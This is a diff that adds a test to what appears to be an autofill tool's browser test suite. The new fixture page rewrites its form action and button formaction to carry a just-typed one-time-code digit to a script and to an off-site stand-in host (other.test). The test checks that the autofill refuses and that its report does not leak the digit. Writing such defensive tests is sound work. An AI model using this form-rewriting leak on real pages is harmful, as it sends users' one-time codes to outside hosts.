@@ -85,9 +85,32 @@ field.addEventListener("input", () => {
 });
 </script>${watch}`;
 
+/**
+ * One code box whose page, once a character goes in, moves the focus on and points the form's
+ * action at a script and Verify's at an address off the site, each holding that character.
+ */
+const rewritingScreen = `<form id="form" method="post" action="/verify">
+<label>Code<input id="code" name="code" inputmode="numeric" autocomplete="one-time-code"></label>
+<label>Other<input id="other" name="other"></label>
+<button id="verify">Verify</button>
+</form>
+<script>
+const box = document.getElementById("code");
+box.addEventListener("input", () => {
+  if (box.value === "") return;
+  document.getElementById("form").setAttribute("action", "javascript:verify('" + box.value + "')");
+  document.getElementById("verify").setAttribute("formaction", "https://code-" + box.value + ".other.test/");
+  document.getElementById("other").focus();
+});
+</script>${watch}`;
+
 /** The step names only the row's first box. */
 const firstBoxStep: AutofillStep = {
   fields: [{ selector: "#box-1", slot: "code" }],
+  submit: "#verify",
+};
+const codeStep: AutofillStep = {
+  fields: [{ selector: "#code", slot: "code" }],
   submit: "#verify",
 };
 const passwordStep: AutofillStep = {
@@ -226,5 +249,23 @@ test("a password whose page moves the focus on after its first key is still refu
   expect(await page.locator("#password").inputValue()).toBe(password[0]);
   expect(await page.locator("#other").inputValue()).toBe("");
   expect(clicks).toEqual([]);
+  expect(received).toEqual([]);
+});
+
+// Once a key may have gone in, page code may have put it in anything the host reads back, so a
+// refusal names no origin but those judged before and keeps no script's code.
+test("a code field whose page moves the focus on after its first key and points its form at that digit keeps the digit out of the refusal", async ({
+  page,
+}) => {
+  const { received } = await serve(page, rewritingScreen);
+  const report = await fill(page, codeStep, [code]);
+  const context: unknown = Reflect.get({ ...Reflect.get(report, "failureDetail") }, "context");
+  expect(context).toMatchObject({
+    check: "destination",
+    part: "form_action",
+    actionOrigins: "javascript: other",
+  });
+  expect(context).not.toHaveProperty("actionScript");
+  expect(JSON.stringify(context)).not.toContain(`code-${code[0]}`);
   expect(received).toEqual([]);
 });
